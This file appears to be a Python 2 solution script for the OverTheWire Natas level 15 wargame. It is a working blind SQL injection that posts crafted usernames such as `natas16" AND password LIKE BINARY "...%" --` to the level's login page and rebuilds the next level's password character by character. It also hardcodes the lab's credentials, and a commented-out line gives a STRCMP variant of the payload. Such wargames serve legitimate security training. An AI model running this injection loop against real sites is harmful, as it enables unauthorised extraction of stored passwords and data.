import requests
import datetime
import sys

key  = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
user = 'natas15'
url  = 'natas15.natas.labs.overthewire.org'
payload = {'username':''}

chars = 'abcdefghijklmnopqrstuvwxzy1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$^&*()-=+|'
currentPassword = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
i = 0
length = len(chars)



while i < length:

    c = chars[i]

    if ( len(currentPassword) == 32 ):
        sys.exit(currentPassword)
    
    # payload.update({'username': 'natas16" AND STRCMP(BINARY substring(`password`,0,' + `len(currentPassword)+1` + '),"' + currentPassword + c + '") -- '})
    payload.update({'username': 'natas16" AND password LIKE BINARY "' + currentPassword + c + '%" -- COLLATE utf8_bin -- '})

    print payload

    time_start = datetime.datetime.now();
    req = requests.post('http://' + user +':'+ key +"@"+ url, payload)
    time_end = datetime.datetime.now();

    if ( 'exists' in req.text ):
        currentPassword += c;
        i = 0
    else:
        i = i + 1






# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))